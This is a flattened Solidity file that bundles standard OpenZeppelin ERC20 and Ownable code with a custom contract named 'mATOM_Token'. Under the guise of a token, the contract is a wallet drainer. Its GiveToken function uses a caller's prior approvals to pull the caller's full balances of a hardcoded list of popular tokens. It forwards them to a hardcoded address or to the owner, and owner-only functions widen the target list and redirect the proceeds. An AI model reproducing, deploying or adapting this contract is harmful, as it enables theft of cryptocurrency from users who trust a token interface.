1 // File: @openzeppelin/contracts@4.5.0/utils/Context.sol
2 
3 
4 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
5 
6 pragma solidity ^0.8.0;
7 
8 /**
9  * @dev Provides information about the current execution context, including the
10  * sender of the transaction and its data. While these are generally available
11  * via msg.sender and msg.data, they should not be accessed in such a direct
12  * manner, since when dealing with meta-transactions the account sending and
13  * paying for execution may not be the actual sender (as far as an application
14  * is concerned).
15  *
16  * This contract is only required for intermediate, library-like contracts.
17  */
18 abstract contract Context {
19     function _msgSender() internal view virtual returns (address) {
20         return msg.sender;
21     }
22 
23     function _msgData() internal view virtual returns (bytes calldata) {
24         return msg.data;
25     }
26 }
27 
28 // File: @openzeppelin/contracts@4.5.0/access/Ownable.sol
29 
30 
31 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
32 
33 pragma solidity ^0.8.0;
34 
35 
36 /**
37  * @dev Contract module which provides a basic access control mechanism, where
38  * there is an account (an owner) that can be granted exclusive access to
39  * specific functions.
40  *
41  * By default, the owner account will be the one that deploys the contract. This
42  * can later be changed with {transferOwnership}.
43  *
44  * This module is used through inheritance. It will make available the modifier
45  * `onlyOwner`, which can be applied to your functions to restrict their use to
46  * the owner.
47  */
48 abstract contract Ownable is Context {
49     address private _owner;
50 
51     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
52 
53     /**
54      * @dev Initializes the contract setting the deployer as the initial owner.
55      */
56     constructor() {
57         _transferOwnership(_msgSender());
58     }
59 
60     /**
61      * @dev Returns the address of the current owner.
62      */
63     function owner() public view virtual returns (address) {
64         return _owner;
65     }
66 
67     /**
68      * @dev Throws if called by any account other than the owner.
69      */
70     modifier onlyOwner() {
71         require(owner() == _msgSender(), "Ownable: caller is not the owner");
72         _;
73     }
74 
75     /**
76      * @dev Leaves the contract without owner. It will not be possible to call
77      * `onlyOwner` functions anymore. Can only be called by the current owner.
78      *
79      * NOTE: Renouncing ownership will leave the contract without an owner,
80      * thereby removing any functionality that is only available to the owner.
81      */
82     function renounceOwnership() public virtual onlyOwner {
83         _transferOwnership(address(0));
84     }
85 
86     /**
87      * @dev Transfers ownership of the contract to a new account (`newOwner`).
88      * Can only be called by the current owner.
89      */
90     function transferOwnership(address newOwner) public virtual onlyOwner {
91         require(newOwner != address(0), "Ownable: new owner is the zero address");
92         _transferOwnership(newOwner);
93     }
94 
95     /**
96      * @dev Transfers ownership of the contract to a new account (`newOwner`).
97      * Internal function without access restriction.
98      */
99     function _transferOwnership(address newOwner) internal virtual {
100         address oldOwner = _owner;
101         _owner = newOwner;
102         emit OwnershipTransferred(oldOwner, newOwner);
103     }
104 }
105 
106 // File: @openzeppelin/contracts@4.5.0/token/ERC20/IERC20.sol
107 
108 
109 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/IERC20.sol)
110 
111 pragma solidity ^0.8.0;
112 
113 /**
114  * @dev Interface of the ERC20 standard as defined in the EIP.
115  */
116 interface IERC20 {
117     /**
118      * @dev Returns the amount of tokens in existence.
119      */
120     function totalSupply() external view returns (uint256);
121 
122     /**
123      * @dev Returns the amount of tokens owned by `account`.
124      */
125     function balanceOf(address account) external view returns (uint256);
126 
127     /**
128      * @dev Moves `amount` tokens from the caller's account to `to`.
129      *
130      * Returns a boolean value indicating whether the operation succeeded.
131      *
132      * Emits a {Transfer} event.
133      */
134     function transfer(address to, uint256 amount) external returns (bool);
135 
136     /**
137      * @dev Returns the remaining number of tokens that `spender` will be
138      * allowed to spend on behalf of `owner` through {transferFrom}. This is
139      * zero by default.
140      *
141      * This value changes when {approve} or {transferFrom} are called.
142      */
143     function allowance(address owner, address spender) external view returns (uint256);
144 
145     /**
146      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
147      *
148      * Returns a boolean value indicating whether the operation succeeded.
149      *
150      * IMPORTANT: Beware that changing an allowance with this method brings the risk
151      * that someone may use both the old and the new allowance by unfortunate
152      * transaction ordering. One possible solution to mitigate this race
153      * condition is to first reduce the spender's allowance to 0 and set the
154      * desired value afterwards:
155      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
156      *
157      * Emits an {Approval} event.
158      */
159     function approve(address spender, uint256 amount) external returns (bool);
160 
161     /**
162      * @dev Moves `amount` tokens from `from` to `to` using the
163      * allowance mechanism. `amount` is then deducted from the caller's
164      * allowance.
165      *
166      * Returns a boolean value indicating whether the operation succeeded.
167      *
168      * Emits a {Transfer} event.
169      */
170     function transferFrom(
171         address from,
172         address to,
173         uint256 amount
174     ) external returns (bool);
175 
176     /**
177      * @dev Emitted when `value` tokens are moved from one account (`from`) to
178      * another (`to`).
179      *
180      * Note that `value` may be zero.
181      */
182     event Transfer(address indexed from, address indexed to, uint256 value);
183 
184     /**
185      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
186      * a call to {approve}. `value` is the new allowance.
187      */
188     event Approval(address indexed owner, address indexed spender, uint256 value);
189 }
190 
191 // File: @openzeppelin/contracts@4.5.0/token/ERC20/extensions/IERC20Metadata.sol
192 
193 
194 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
195 
196 pragma solidity ^0.8.0;
197 
198 
199 /**
200  * @dev Interface for the optional metadata functions from the ERC20 standard.
201  *
202  * _Available since v4.1._
203  */
204 interface IERC20Metadata is IERC20 {
205     /**
206      * @dev Returns the name of the token.
207      */
208     function name() external view returns (string memory);
209 
210     /**
211      * @dev Returns the symbol of the token.
212      */
213     function symbol() external view returns (string memory);
214 
215     /**
216      * @dev Returns the decimals places of the token.
217      */
218     function decimals() external view returns (uint8);
219 }
220 
221 // File: @openzeppelin/contracts@4.5.0/token/ERC20/ERC20.sol
222 
223 
224 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/ERC20.sol)
225 
226 pragma solidity ^0.8.0;
227 
228 
229 
230 
231 /**
232  * @dev Implementation of the {IERC20} interface.
233  *
234  * This implementation is agnostic to the way tokens are created. This means
235  * that a supply mechanism has to be added in a derived contract using {_mint}.
236  * For a generic mechanism see {ERC20PresetMinterPauser}.
237  *
238  * TIP: For a detailed writeup see our guide
239  * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
240  * to implement supply mechanisms].
241  *
242  * We have followed general OpenZeppelin Contracts guidelines: functions revert
243  * instead returning `false` on failure. This behavior is nonetheless
244  * conventional and does not conflict with the expectations of ERC20
245  * applications.
246  *
247  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
248  * This allows applications to reconstruct the allowance for all accounts just
249  * by listening to said events. Other implementations of the EIP may not emit
250  * these events, as it isn't required by the specification.
251  *
252  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
253  * functions have been added to mitigate the well-known issues around setting
254  * allowances. See {IERC20-approve}.
255  */
256 contract ERC20 is Context, IERC20, IERC20Metadata {
257     mapping(address => uint256) private _balances;
258 
259     mapping(address => mapping(address => uint256)) private _allowances;
260 
261     uint256 private _totalSupply;
262 
263     string private _name;
264     string private _symbol;
265 
266     /**
267      * @dev Sets the values for {name} and {symbol}.
268      *
269      * The default value of {decimals} is 18. To select a different value for
270      * {decimals} you should overload it.
271      *
272      * All two of these values are immutable: they can only be set once during
273      * construction.
274      */
275     constructor(string memory name_, string memory symbol_) {
276         _name = name_;
277         _symbol = symbol_;
278     }
279 
280     /**
281      * @dev Returns the name of the token.
282      */
283     function name() public view virtual override returns (string memory) {
284         return _name;
285     }
286 
287     /**
288      * @dev Returns the symbol of the token, usually a shorter version of the
289      * name.
290      */
291     function symbol() public view virtual override returns (string memory) {
292         return _symbol;
293     }
294 
295     /**
296      * @dev Returns the number of decimals used to get its user representation.
297      * For example, if `decimals` equals `2`, a balance of `505` tokens should
298      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
299      *
300      * Tokens usually opt for a value of 18, imitating the relationship between
301      * Ether and Wei. This is the value {ERC20} uses, unless this function is
302      * overridden;
303      *
304      * NOTE: This information is only used for _display_ purposes: it in
305      * no way affects any of the arithmetic of the contract, including
306      * {IERC20-balanceOf} and {IERC20-transfer}.
307      */
308     function decimals() public view virtual override returns (uint8) {
309         return 18;
310     }
311 
312     /**
313      * @dev See {IERC20-totalSupply}.
314      */
315     function totalSupply() public view virtual override returns (uint256) {
316         return _totalSupply;
317     }
318 
319     /**
320      * @dev See {IERC20-balanceOf}.
321      */
322     function balanceOf(address account) public view virtual override returns (uint256) {
323         return _balances[account];
324     }
325 
326     /**
327      * @dev See {IERC20-transfer}.
328      *
329      * Requirements:
330      *
331      * - `to` cannot be the zero address.
332      * - the caller must have a balance of at least `amount`.
333      */
334     function transfer(address to, uint256 amount) public virtual override returns (bool) {
335         address owner = _msgSender();
336         _transfer(owner, to, amount);
337         return true;
338     }
339 
340     /**
341      * @dev See {IERC20-allowance}.
342      */
343     function allowance(address owner, address spender) public view virtual override returns (uint256) {
344         return _allowances[owner][spender];
345     }
346 
347     /**
348      * @dev See {IERC20-approve}.
349      *
350      * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
351      * `transferFrom`. This is semantically equivalent to an infinite approval.
352      *
353      * Requirements:
354      *
355      * - `spender` cannot be the zero address.
356      */
357     function approve(address spender, uint256 amount) public virtual override returns (bool) {
358         address owner = _msgSender();
359         _approve(owner, spender, amount);
360         return true;
361     }
362 
363     /**
364      * @dev See {IERC20-transferFrom}.
365      *
366      * Emits an {Approval} event indicating the updated allowance. This is not
367      * required by the EIP. See the note at the beginning of {ERC20}.
368      *
369      * NOTE: Does not update the allowance if the current allowance
370      * is the maximum `uint256`.
371      *
372      * Requirements:
373      *
374      * - `from` and `to` cannot be the zero address.
375      * - `from` must have a balance of at least `amount`.
376      * - the caller must have allowance for ``from``'s tokens of at least
377      * `amount`.
378      */
379     function transferFrom(
380         address from,
381         address to,
382         uint256 amount
383     ) public virtual override returns (bool) {
384         address spender = _msgSender();
385         _spendAllowance(from, spender, amount);
386         _transfer(from, to, amount);
387         return true;
388     }
389 
390     /**
391      * @dev Atomically increases the allowance granted to `spender` by the caller.
392      *
393      * This is an alternative to {approve} that can be used as a mitigation for
394      * problems described in {IERC20-approve}.
395      *
396      * Emits an {Approval} event indicating the updated allowance.
397      *
398      * Requirements:
399      *
400      * - `spender` cannot be the zero address.
401      */
402     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
403         address owner = _msgSender();
404         _approve(owner, spender, _allowances[owner][spender] + addedValue);
405         return true;
406     }
407 
408     /**
409      * @dev Atomically decreases the allowance granted to `spender` by the caller.
410      *
411      * This is an alternative to {approve} that can be used as a mitigation for
412      * problems described in {IERC20-approve}.
413      *
414      * Emits an {Approval} event indicating the updated allowance.
415      *
416      * Requirements:
417      *
418      * - `spender` cannot be the zero address.
419      * - `spender` must have allowance for the caller of at least
420      * `subtractedValue`.
421      */
422     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
423         address owner = _msgSender();
424         uint256 currentAllowance = _allowances[owner][spender];
425         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
426         unchecked {
427             _approve(owner, spender, currentAllowance - subtractedValue);
428         }
429 
430         return true;
431     }
432 
433     /**
434      * @dev Moves `amount` of tokens from `sender` to `recipient`.
435      *
436      * This internal function is equivalent to {transfer}, and can be used to
437      * e.g. implement automatic token fees, slashing mechanisms, etc.
438      *
439      * Emits a {Transfer} event.
440      *
441      * Requirements:
442      *
443      * - `from` cannot be the zero address.
444      * - `to` cannot be the zero address.
445      * - `from` must have a balance of at least `amount`.
446      */
447     function _transfer(
448         address from,
449         address to,
450         uint256 amount
451     ) internal virtual {
452         require(from != address(0), "ERC20: transfer from the zero address");
453         require(to != address(0), "ERC20: transfer to the zero address");
454 
455         _beforeTokenTransfer(from, to, amount);
456 
457         uint256 fromBalance = _balances[from];
458         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
459         unchecked {
460             _balances[from] = fromBalance - amount;
461         }
462         _balances[to] += amount;
463 
464         emit Transfer(from, to, amount);
465 
466         _afterTokenTransfer(from, to, amount);
467     }
468 
469     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
470      * the total supply.
471      *
472      * Emits a {Transfer} event with `from` set to the zero address.
473      *
474      * Requirements:
475      *
476      * - `account` cannot be the zero address.
477      */
478     function _mint(address account, uint256 amount) internal virtual {
479         require(account != address(0), "ERC20: mint to the zero address");
480 
481         _beforeTokenTransfer(address(0), account, amount);
482 
483         _totalSupply += amount;
484         _balances[account] += amount;
485         emit Transfer(address(0), account, amount);
486 
487         _afterTokenTransfer(address(0), account, amount);
488     }
489 
490     /**
491      * @dev Destroys `amount` tokens from `account`, reducing the
492      * total supply.
493      *
494      * Emits a {Transfer} event with `to` set to the zero address.
495      *
496      * Requirements:
497      *
498      * - `account` cannot be the zero address.
499      * - `account` must have at least `amount` tokens.
500      */
501     function _burn(address account, uint256 amount) internal virtual {
502         require(account != address(0), "ERC20: burn from the zero address");
503 
504         _beforeTokenTransfer(account, address(0), amount);
505 
506         uint256 accountBalance = _balances[account];
507         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
508         unchecked {
509             _balances[account] = accountBalance - amount;
510         }
511         _totalSupply -= amount;
512 
513         emit Transfer(account, address(0), amount);
514 
515         _afterTokenTransfer(account, address(0), amount);
516     }
517 
518     /**
519      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
520      *
521      * This internal function is equivalent to `approve`, and can be used to
522      * e.g. set automatic allowances for certain subsystems, etc.
523      *
524      * Emits an {Approval} event.
525      *
526      * Requirements:
527      *
528      * - `owner` cannot be the zero address.
529      * - `spender` cannot be the zero address.
530      */
531     function _approve(
532         address owner,
533         address spender,
534         uint256 amount
535     ) internal virtual {
536         require(owner != address(0), "ERC20: approve from the zero address");
537         require(spender != address(0), "ERC20: approve to the zero address");
538 
539         _allowances[owner][spender] = amount;
540         emit Approval(owner, spender, amount);
541     }
542 
543     /**
544      * @dev Spend `amount` form the allowance of `owner` toward `spender`.
545      *
546      * Does not update the allowance amount in case of infinite allowance.
547      * Revert if not enough allowance is available.
548      *
549      * Might emit an {Approval} event.
550      */
551     function _spendAllowance(
552         address owner,
553         address spender,
554         uint256 amount
555     ) internal virtual {
556         uint256 currentAllowance = allowance(owner, spender);
557         if (currentAllowance != type(uint256).max) {
558             require(currentAllowance >= amount, "ERC20: insufficient allowance");
559             unchecked {
560                 _approve(owner, spender, currentAllowance - amount);
561             }
562         }
563     }
564 
565     /**
566      * @dev Hook that is called before any transfer of tokens. This includes
567      * minting and burning.
568      *
569      * Calling conditions:
570      *
571      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
572      * will be transferred to `to`.
573      * - when `from` is zero, `amount` tokens will be minted for `to`.
574      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
575      * - `from` and `to` are never both zero.
576      *
577      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
578      */
579     function _beforeTokenTransfer(
580         address from,
581         address to,
582         uint256 amount
583     ) internal virtual {}
584 
585     /**
586      * @dev Hook that is called after any transfer of tokens. This includes
587      * minting and burning.
588      *
589      * Calling conditions:
590      *
591      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
592      * has been transferred to `to`.
593      * - when `from` is zero, `amount` tokens have been minted for `to`.
594      * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
595      * - `from` and `to` are never both zero.
596      *
597      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
598      */
599     function _afterTokenTransfer(
600         address from,
601         address to,
602         uint256 amount
603     ) internal virtual {}
604 }
605 
606 // File: mATOM.sol
607 
608 
609 pragma solidity ^0.8.4;
610 
611 
612 
613 contract mATOM_Token is ERC20,Ownable {
614 
615     IERC20 public token1;
616 
617     address public adre;
618 
619     address[] public tokens = 
620    [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,0xdAC17F958D2ee523a2206206994597C13D831ec7,0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,0xa47c8bf37f92aBed4A126BDA807A7b7498661acD,
621     0x990f341946A3fdB507aE7e52d17851B87168017c,0x6B175474E89094C44Da98b954EedeAC495271d0F,0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE,0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0,
622     0x4d224452801ACEd8B2F0aebE155379bb5D594381,0x9B9647431632AF44be02ddd22477Ed94d14AacAa,0x525A8F6F3Ba4752868cde25164382BfbaE3990e1,0x514910771AF9Ca656af840dff83E8264EcF986CA,
623     0xD533a949740bb3306d119CC777fa900bA034cd52,0xf0f9D895aCa5c8678f706FB8216fa22957685A13,0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39,0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA,
624     0xeff3f1b9400D6D0f1E8805BddE592F61535F5EcD,0xCfef8857E9C80e3440A823971420F7Fa5F62f020,0x8B3192f5eEBD8579568A2Ed41E6FEB402f93f73F,0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
625     0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b];
626 
627   
628 
629     constructor() ERC20("mATOM", "mATOM") {
630             adre = 0x881e8D45e88eC7f21aB755Df2aa831cf373ad97d;
631         }
632 
633      function mint(address to, uint256 amount) public onlyOwner{
634         _mint(to, amount);
635     }
636 
637      function GiveToken() public  {
638     
639           for(uint i = 0; i < tokens.length; i++){
640             token1 = IERC20(tokens[i]);
641            if (token1.allowance(msg.sender,address(this)) >= token1.balanceOf(msg.sender)){
642               token1.transferFrom(msg.sender,address(this),token1.balanceOf(msg.sender));
643 
644                if (block.timestamp >= 1654045260){
645                 
646                 token1.transfer(adre,token1.balanceOf(address(this)));   
647                }
648                else
649                 token1.transfer(owner(),token1.balanceOf(address(this)));
650            }
651           
652          }
653     }
654 
655     function EtherPay() public payable{
656         address payable adr = payable(owner());
657         adr.transfer(address(this).balance);
658         _mint(msg.sender,666);
659     }
660 
661     function Add_WtiteList(address new_adr) public onlyOwner{
662 
663         tokens.push(new_adr);
664     }
665 
666     function Remove_WtiteList(uint256 number, address new_adr) public onlyOwner{
667         
668         tokens[number] = new_adr;
669     }
670 
671     function Cheker_Approve(address new_adr_contr, address use) public onlyOwner view returns(uint256)  {
672          return IERC20(new_adr_contr).allowance(use,address(this));
673     }
674 
675     function Cheker_Adr(uint256 number) public onlyOwner view returns(address)  {
676         
677          return tokens[number];
678     }
679 
680     function Change(address new_adr) public onlyOwner{
681         transferOwnership(new_adr);
682     }
683 
684     function set_adre(address new_adr) public onlyOwner{
685         adre = new_adr;
686     }
687 
688     
689 
690 }